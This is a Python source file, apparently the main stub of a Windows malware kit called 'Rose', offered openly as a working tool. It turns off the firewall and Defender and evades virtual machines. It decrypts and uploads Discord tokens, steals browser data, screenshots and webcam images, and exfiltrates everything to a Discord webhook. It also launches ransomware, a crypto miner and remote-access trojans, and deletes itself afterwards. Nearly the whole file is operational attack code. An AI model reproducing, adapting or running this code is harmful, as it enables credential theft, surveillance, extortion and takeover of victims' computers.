from deviceinf import send_device_information
import rose_rat
import re
import InjectX
from dhooks import Embed
import knight_rat
import discordc
import subprocess
from uac_bypass import GetSelf, IsAdmin, UACbypass
from browser import Browsers
import startup
import random
import _roblox
import doggo_ransomware
from config import Config
from __webhook import _WebhookX
from crypto_miner import miner
from antivm import protection_check
cc = Config()
from Crypto.Cipher import AES
import platform
import shutil
import ctypes
from _random_string import *
import os
import pygame
import pygame.camera
import getpass
import threading
from base64 import b64decode
from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
from json import loads as json_loads
from ipinf import Info
import sys
import requests
from PIL import ImageGrab
pygame.camera.init()

if platform.system() != "Windows":
    sys.exit()

main_path = f'{os.getenv("APPDATA")}\ROSE_ON_TOP'
webhook = cc.get_webhook()
debug_mode = cc.get_debug_mode()
wh_avatar = cc.get_avatar()
wh_name = cc.get_name()
eb_color = cc.get_color()
eb_footer = cc.get_footer()

Threadlist = []
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
username = getpass.getuser()

class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def send_error_notification(exception, type):
    webx = _WebhookX().get_object()

    embed = Embed(
        description='Rose error catcher.',
        color=eb_color,
        timestamp='now'
    )

    embed.set_author(name=wh_name, icon_url=wh_avatar)
    embed.set_footer(text=eb_footer, icon_url=wh_avatar)
    embed.add_field(name=f"Error in {type} occured | Help us by reporting this bug",
                    value=f'Advanced Log: ```{exception}```')

    webx.send(embed=embed)

class create_homefold():
    if not os.path.exists(main_path):
        try:
            os.mkdir(main_path)
        except Exception as e:
            send_error_notification(e, 'Rose Home Creator')

if cc.get_start_up():
    try:
        startup.Startup()
    except Exception as e:
        send_error_notification(e, 'Rose Startup')

if cc.get_fake_error():
    try:
        error_codes = [
            (0x800F081F, "Windows could not find the requested file. Please make sure you have the correct path and try again. If the issue persists, contact your system administrator."),
            (0x8024001E, "An error occurred while checking for updates. Please check your internet connection and try again."),
            (0xC000021A, "The system has encountered a critical error and needs to restart."),
            (0x80070002, "The system cannot find the specified file."),
            (0xC0000142, "The application failed to start correctly (0xC0000142). Click OK to close the application."),
            (0xE000020B, "A network error occurred while trying to access the requested resource."),
            (0x80246007, "Windows Update encountered an unknown error."),
            (0x8007045A, "The requested operation requires elevation. Please run the program as an administrator."),
            (0x80070005, "Access is denied. Please make sure you have the necessary permissions to access this file or directory."),
            (0x8007007E, "The specified module could not be found. Please reinstall the program to fix this issue."),
            (0x80244019, "An error occurred while trying to connect to the Windows Update server. Please check your internet connection."),
            (0x800B0109, "A certificate chain processed correctly, but terminated in a root certificate which is not trusted by the trust provider."),
            (0xC0000005, "The application was unable to start correctly (0xC0000005). Click OK to close the application."),
            (0x80070020, "The process cannot access the file because it is being used by another process."),
            (0x80070057, "The parameter is incorrect. Please provide valid input and try again."),
            (0xC0000221, "The file system structure on the disk is corrupt and unusable. Please run the Chkdsk utility to fix the problem."),
            (0x800701B1, "The drive is not ready. Please make sure a disk is inserted and try again."),
            (0x80240036, "Software installation has been disabled on your system. Please contact your system administrator."),
            (0xC000012F, "The system cannot find message text for message number 0x{0:X} in the message file for {1}."),
            (0x80072EE7, "The server name or address could not be resolved. Please check your network connection."),
            (0xC0000135, "The program can't start because %hs is missing from your computer. Try reinstalling the program to fix this problem."),
            (0x80070091, "The directory is not empty. Please remove any files or subdirectories and try again."),
            (0x8007000E, "Not enough storage is available to complete this operation. Please free up some space and try again."),
            (0xC0000218, "The registry cannot load the hive (file): \\SystemRoot\\System32\\Config\\SOFTWARE or its log or alternate."),
            (0x80040154, "Class not registered. Please make sure the file is properly registered."),
        ]
        
        error_code, error_message = random.choice(error_codes)

        ctypes.windll.user32.MessageBoxW(0, error_message, f"Error Code: 0x{error_code:08X}", 16)
    except Exception as e:
        send_error_notification(e, 'Rose Fake Error')

if cc.get_antivm():
    try:
        if protection_check():
            os._exit(0)
    except Exception as e:
        send_error_notification(e, 'Rose Anti-VM')

if cc.get_uac_bypass():
    try:
        if not IsAdmin():
            if GetSelf()[1]:
                if UACbypass():
                    subprocess.run('netsh advfirewall set domainprofile state off', shell=True)
                    subprocess.run('Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1', shell=True)
    except Exception as e:
        send_error_notification(e, 'Rose UAC Bypass')

if cc.get_discord_ping():
    try:
        webx = _WebhookX().get_object()

        embed = Embed(
            description='Rose notifier.',
            color=eb_color,
            timestamp='now'
        )

        embed.set_author(name=wh_name, icon_url=wh_avatar)
        embed.set_footer(text=eb_footer, icon_url=wh_avatar)
        embed.add_field(name=f"Oh, it looks like we\'ve encountered another individual...",
                        value=f'Transmitting information log originating from **{username}**')

        webx.send(embed=embed)
        webx.send('@everyone')
    except Exception as e:
        send_error_notification(e, 'Rose Ping')

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
    if starts in ("v10", "v11"):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def CryptUnprotectData(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None,
                                         byref(blob_entropy), None, None, 0x01,
                                         byref(blob_out)):
        return GetData(blob_out)

Tokens = ""
dclass = discordc.DiscordX()

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"):
        return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)

    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{pathC}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for token in re.findall(
                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(
                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
                    if dclass.checkToken(
                            tokenDecoded) and tokenDecoded not in Tokens:
                        # print(token)
                        Tokens += tokenDecoded
                        # writeforfile(Tokens, 'tokens')
                        dclass.uploadToken(tokenDecoded)

def GetTokens(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                    x.strip() for x in open(f"{path}\\{file}",
                                            errors="ignore").readlines()
                    if x.strip()
            ]:
                for regex in (
                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                        r"mfa\.[\w-]{80,95}",
                ):
                    for token in re.findall(regex, line):
                        global Tokens
                        if dclass.checkToken(token) and token not in Tokens:
                            Tokens += token
                            dclass.uploadToken(token)

discordPaths = [
    [f"{roaming}/Discord", "/Local Storage/leveldb"],
    [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
    [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
    [f"{roaming}/discordptb", "/Local Storage/leveldb"],
]

if cc.get_token_stealing():
    for patt in discordPaths:
            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
            a.start()
            Threadlist.append(a)

if cc.get_browser_stealing():
    try:
        browsers = Browsers(webhook)
    except Exception as e:
        send_error_notification(e, 'Rose Browser Stealer')

if cc.get_screenshot():
    try:
        rndm_strr = get_random_string(5)
        path = f"{main_path}\\screenshot_{rndm_strr}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(path)
        
        files = {"screenshot": open(path, "rb")}
        requests.post(webhook, files=files)
        files["screenshot"].close()
        
        os.remove(path)
    except Exception as e:
        send_error_notification(e, 'Rose Screenshot Stealer')
    
if cc.get_webcam():
    camlist = pygame.camera.list_cameras()

    try:
        rndm_strr = get_random_string(5)
        if camlist:
            cam = pygame.camera.Camera(camlist[0], (640, 480))
            cam.start()
            image = cam.get_image()
            path = f"{main_path}\\webcam_{rndm_strr}.png"
            pygame.image.save(image, path)
            cam.stop()
            files = {"webcam": open(path, "rb")}
            requests.post(webhook, files=files)
            files["webcam"].close()

            os.remove(path)
    except Exception as e:
            send_error_notification(e, 'Rose Webcam Stealer')

if cc.get_deviceinf_stealing():
    try:
        send_device_information()
    except Exception as e:
        send_error_notification(e, 'Rose Device Data Stealing')

if cc.get_injection():
    try:
        InjectX.InjectionX(webhook)
    except Exception as e:
        send_error_notification(e, 'Rose Discord Injection')

if cc.get_roblox_stealing():
    try:
        _roblox.RobloxX().run()
    except Exception as e:
        send_error_notification(e, 'Rose Roblox Stealer')

if cc.get_ipinf_stealing():
    try:
        Info().send_data()
    except Exception as e:
        send_error_notification(e, 'Rose IP & Wi-Fi Data')

if cc.silent_crypto_miner():
    try:
        miner.run_miner()
    except Exception as e:
        send_error_notification(e, 'Rose Silent Crypto Miner')

class remove_homefold():
    if os.path.exists(main_path):
        try:
            shutil.rmtree(main_path)
        except Exception as e:
            send_device_information(e, 'Rose Home Remover')

if cc.get_ransomware():
    try:
        ds = doggo_ransomware.DoggoRansomware()
        
    except Exception as e:
        send_error_notification(e, 'Doggo Ransomware')

if cc.get_knight_discord_rat():
    try:
        knight_rat.run_rat()
    except Exception as e:
        send_error_notification(e, 'Knight Remote Access')

if cc.get_rose_discord_rat():
    try:
        rose_rat.run_rat()
    except Exception as e:
        send_error_notification(e, 'Rose Remote Access')

if cc.get_rose_melt_stub():
    try:
        path = sys.argv[0]

        subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

        sys.exit()
    except Exception as e:
        send_error_notification(e, 'Rose Killer')
